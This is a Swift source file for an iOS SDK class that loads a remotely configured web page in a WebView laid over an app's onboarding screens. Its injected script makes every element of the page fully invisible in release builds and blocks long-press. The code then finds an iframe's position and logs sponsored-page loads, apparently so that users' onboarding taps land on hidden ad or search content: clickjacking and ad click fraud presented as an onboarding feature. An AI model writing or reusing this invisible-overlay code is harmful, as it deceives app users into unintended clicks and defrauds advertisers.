import UIKit
import WebKit

/// Manages Silent RSOC WebView overlay for onboarding flow.
///
/// This manager handles preloading, displaying, and managing the RSOC WebView
/// that overlays the onboarding screens.
///
/// - Note: This class is used internally by `RSOCService`. Use `RSOCService.shared`
///   for the public API.
public final class SilentRSOCManager: NSObject, @unchecked Sendable {
    
    /// Represents the current screen in the RSOC flow.
    public enum RSOCScreen: Int, Sendable {
        case screen1 = 1
        case screen2 = 2
        case sponsor = 3
    }
    
    /// Shared singleton instance.
    public static let shared = SilentRSOCManager()
    
    /// The main RSOC WebView.
    public private(set) var webView: WKWebView?
    
    /// Current screen in the RSOC flow.
    public private(set) var currentScreen: RSOCScreen = .screen1
    
    /// WebView for the sponsor page (created on target="_blank" navigation).
    public private(set) var sponsorWebView: WKWebView?
    
    /// Whether the RSOC WebView is loaded and ready.
    public private(set) var isReady = false
    
    /// Called when navigation is detected (link click, target=_blank, etc.)
    public var onNavigationDetected: (@Sendable () -> Void)?
    
    private var loadCompletion: (@Sendable (Bool) -> Void)?
    private var elementRectCallback: (@Sendable (CGRect?) -> Void)?
    private var loadTimeoutTimer: Timer?
    private var navigationObservation: NSKeyValueObservation?
    
    private let loadTimeout: TimeInterval = 10.0

    #if DEBUG
    /// Debug API: Override the opacity used in the invisibility script.
    /// Valid range: 0.0 (fully invisible) to 1.0 (fully visible). Defaults to 0.0.
    public var debugInvisibilityOpacity: Double? {
        get { debugInvisibilityOpacityStorage }
        set {
            guard let value = newValue else {
                debugInvisibilityOpacityStorage = nil
                return
            }
            debugInvisibilityOpacityStorage = min(max(value, 0.0), 1.0)
        }
    }
    
    private var debugInvisibilityOpacityStorage: Double?
    #endif
    
    private override init() {
        super.init()
    }
    
    // MARK: - Configuration
    
    /// RSOC configuration from the remote config.
    public var config: ConfigResponse.Localization.SilentRSOCConfig? {
        IntegrationFramework.shared.getConfig()?.localization.silentRsocConfig
    }
    
    /// Whether RSOC is enabled in the configuration.
    public var isEnabled: Bool {
        guard let config = config else { return false }
        return config.isEnabled
    }
    
    // MARK: - Preloading
    
    /// Preloads the RSOC WebView.
    ///
    /// Call this during app startup (e.g., splash screen) to preload the RSOC content.
    ///
    /// - Parameter completion: Called with `true` if preload succeeded, `false` otherwise.
    public func preload(completion: (@Sendable (Bool) -> Void)? = nil) {
        guard isEnabled, let config = config, let url = URL(string: config.link) else {
            print("⚠️ RSOC preload skipped: enabled=\(isEnabled), config=\(config != nil)")
            completion?(false)
            return
        }
        
        print("🔄 RSOC preload starting for URL: \(url)")
        
        loadCompletion = completion
        currentScreen = .screen1
        isReady = false
        
        let configuration = WKWebViewConfiguration()
        configuration.userContentController.add(self, name: "rsoc")
        
        // Add user script to make content invisible and disable long press
        let invisibilityScript = makeInvisibilityScript(opacity: effectiveInvisibilityOpacity)
        let userScript = WKUserScript(
            source: invisibilityScript, injectionTime: .atDocumentStart, forMainFrameOnly: false)
        configuration.userContentController.addUserScript(userScript)
        
        // Use screen bounds for initial frame so content renders properly during preload
        let webView = WKWebView(frame: UIScreen.main.bounds, configuration: configuration)
        webView.navigationDelegate = self
        webView.uiDelegate = self
        webView.scrollView.isScrollEnabled = false
        webView.scrollView.bounces = false
        
        self.webView = webView
        
        startLoadTimeout()
        webView.load(URLRequest(url: url))
    }
    
    // MARK: - Element Detection
    
    /// Queries the current RSOC page for the clickable element position.
    ///
    /// - Parameters:
    ///   - screen: The screen to get element rect for.
    ///   - completion: Called with the element rect, or `nil` if not found.
    public func getElementRect(for screen: RSOCScreen, completion: @escaping @Sendable (CGRect?) -> Void) {
        guard let webView = webView else {
            print("⚠️ getElementRect: no webView")
            completion(nil)
            return
        }
        
        print("🔍 getElementRect for screen: \(screen)")
        
        webView.evaluateJavaScript("document.documentElement.outerHTML") { [weak self] result, error in
            if let html = result as? String {
                print("📄 HTML length: \(html.count)")
                
                let elementId: String
                switch screen {
                case .screen1, .screen2:
                    elementId = "master-1"
                    if html.contains("id=\"\(elementId)\"") || html.contains("id='\(elementId)'") {
                        print("✅ Found iframe #\(elementId) in HTML")
                    } else {
                        print("⚠️ iframe #\(elementId) NOT found in HTML")
                        print("📄 HTML preview: \(String(html.prefix(3000)))")
                    }
                case .sponsor:
                    completion(nil)
                    return
                }
                
                self?.getElementRectFromDOM(for: screen, completion: completion)
            } else {
                print("⚠️ Could not get HTML: \(error?.localizedDescription ?? "unknown")")
                completion(nil)
            }
        }
    }
    
    private func getElementRectFromDOM(for screen: RSOCScreen, completion: @escaping @Sendable (CGRect?) -> Void) {
        guard let webView = webView else {
            completion(nil)
            return
        }
        
        elementRectCallback = completion
        
        let script: String
        switch screen {
        case .screen1, .screen2:
            script = """
                (function() {
                    var el = document.getElementById('master-1');
                    if (el) {
                        var rect = el.getBoundingClientRect();
                        window.webkit.messageHandlers.rsoc.postMessage({
                            type: 'elementRect',
                            x: rect.x,
                            y: rect.y,
                            width: rect.width,
                            height: rect.height
                        });
                    } else {
                        window.webkit.messageHandlers.rsoc.postMessage({type: 'elementRect', error: 'not_found'});
                    }
                })();
                """
        case .sponsor:
            completion(nil)
            return
        }
        
        webView.evaluateJavaScript(script) { _, error in
            if let error = error {
                print("⚠️ JS error: \(error)")
                completion(nil)
            }
        }
    }
    
    // MARK: - Screen Transitions
    
    /// Advances to the next screen in the RSOC flow.
    public func advanceToNextScreen() {
        switch currentScreen {
        case .screen1:
            currentScreen = .screen2
            logAnalytics(for: .screen2)
        case .screen2:
            currentScreen = .sponsor
            logAnalytics(for: .sponsor)
        case .sponsor:
            break
        }
    }
    
    // MARK: - Sponsor Page
    
    /// Whether the sponsor page should be visible based on configuration.
    public var isSponsorPageVisible: Bool {
        config?.isSponsorPageVisible ?? false
    }
    
    /// Gets the sponsor WebView to display when paywall closes.
    ///
    /// - Returns: The sponsor WebView if on sponsor screen, otherwise `nil`.
    public func getSponsorWebView() -> WKWebView? {
        guard currentScreen == .sponsor else { return nil }
        return webView
    }
    
    // MARK: - Cleanup
    
    /// Cleans up RSOC resources.
    ///
    /// Call this when the RSOC flow is complete.
    public func cleanup() {
        loadTimeoutTimer?.invalidate()
        loadTimeoutTimer = nil
        navigationObservation = nil
        webView?.configuration.userContentController.removeScriptMessageHandler(forName: "rsoc")
        webView = nil
        sponsorWebView = nil
        isReady = false
        currentScreen = .screen1
    }
    
    // MARK: - Private Helpers
    
    private func startLoadTimeout() {
        loadTimeoutTimer?.invalidate()
        loadTimeoutTimer = Timer.scheduledTimer(withTimeInterval: loadTimeout, repeats: false) { [weak self] _ in
            self?.handleLoadFailure()
        }
    }
    
    private func cancelLoadTimeout() {
        loadTimeoutTimer?.invalidate()
        loadTimeoutTimer = nil
    }
    
    private func handleLoadSuccess() {
        cancelLoadTimeout()
        isReady = true
        loadCompletion?(true)
        loadCompletion = nil
        logAnalytics(for: .screen1)
    }
    
    private func handleLoadFailure() {
        cancelLoadTimeout()
        isReady = false
        loadCompletion?(false)
        loadCompletion = nil
        cleanup()
    }
    
    private func logAnalytics(for screen: RSOCScreen) {
        switch screen {
        case .screen1:
            IntegrationFramework.shared.log(event: .silentRsocScreen1View)
        case .screen2:
            IntegrationFramework.shared.log(event: .silentRsocScreen2View)
        case .sponsor:
            IntegrationFramework.shared.log(event: .silentRsocSponsoredPageLoad)
        }
    }
    
    /// Injects CSS to make WebView content invisible.
    public func injectInvisibilityCSS() {
        guard let webView = webView else { return }
        
        let script = makeInvisibilityScript(opacity: effectiveInvisibilityOpacity, appendToHead: true)
        webView.alpha = 0.5
        webView.evaluateJavaScript(script, completionHandler: nil)
    }

    // MARK: - Invisibility Script

    private var effectiveInvisibilityOpacity: Double {
        #if DEBUG
        return debugInvisibilityOpacityStorage ?? 0.0
        #else
        return 0.0
        #endif
    }

    private func makeInvisibilityScript(opacity: Double, appendToHead: Bool = false) -> String {
        let insertTarget = appendToHead ? "document.head" : "document.documentElement"
        return """
            (function() {
                var style = document.createElement('style');
                style.id = 'rsoc-invisible';
                style.textContent = '* { opacity: \(opacity) !important; background: transparent !important; -webkit-touch-callout: none !important; -webkit-user-select: none !important; user-select: none !important; }';
                if (!document.getElementById('rsoc-invisible')) {
                    \(insertTarget).appendChild(style);
                } else {
                    document.getElementById('rsoc-invisible').textContent = style.textContent;
                }
                document.addEventListener('contextmenu', function(e) { e.preventDefault(); }, false);
            })();
            """
    }
}

// MARK: - WKNavigationDelegate

extension SilentRSOCManager: WKNavigationDelegate {
    public func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        print("✅ RSOC WebView didFinish, URL: \(webView.url?.absoluteString ?? "nil")")
        
        injectInvisibilityCSS()
        
        if currentScreen == .screen1 && !isReady {
            handleLoadSuccess()
        }
    }
    
    public func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        print("❌ RSOC WebView didFail: \(error)")
        handleLoadFailure()
    }
    
    public func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        print("❌ RSOC WebView didFailProvisionalNavigation: \(error)")
        handleLoadFailure()
    }
    
    public func webView(
        _ webView: WKWebView,
        decidePolicyFor navigationAction: WKNavigationAction,
        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
    ) {
        print("🔗 RSOC decidePolicyFor: \(navigationAction.request.url?.absoluteString ?? "nil"), targetFrame: \(navigationAction.targetFrame?.isMainFrame ?? false)")
        
        if navigationAction.navigationType == .linkActivated {
            print("🔗 Link activated - will trigger navigation handler")
            onNavigationDetected?()
        }
        
        decisionHandler(.allow)
    }
}

// MARK: - WKUIDelegate

extension SilentRSOCManager: WKUIDelegate {
    public func webView(
        _ webView: WKWebView,
        createWebViewWith configuration: WKWebViewConfiguration,
        for navigationAction: WKNavigationAction,
        windowFeatures: WKWindowFeatures
    ) -> WKWebView? {
        print("🔗 RSOC createWebViewWith (target=_blank): \(navigationAction.request.url?.absoluteString ?? "nil")")
        
        onNavigationDetected?()
        
        let newWebView = WKWebView(frame: .zero, configuration: configuration)
        sponsorWebView = newWebView
        
        return newWebView
    }
}

// MARK: - WKScriptMessageHandler

extension SilentRSOCManager: WKScriptMessageHandler {
    public func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        print("📨 RSOC message received: \(message.body)")
        
        guard message.name == "rsoc",
              let body = message.body as? [String: Any],
              let type = body["type"] as? String
        else {
            return
        }
        
        switch type {
        case "elementRect":
            if let error = body["error"] {
                print("⚠️ Element error: \(error)")
                elementRectCallback?(nil)
            } else if let x = body["x"] as? CGFloat,
                      let y = body["y"] as? CGFloat,
                      let width = body["width"] as? CGFloat,
                      let height = body["height"] as? CGFloat {
                let rect = CGRect(x: x, y: y, width: width, height: height)
                print("✅ Element rect: \(rect)")
                elementRectCallback?(rect)
            } else {
                print("⚠️ Could not parse element rect from body: \(body)")
                elementRectCallback?(nil)
            }
            elementRectCallback = nil
        default:
            break
        }
    }
}
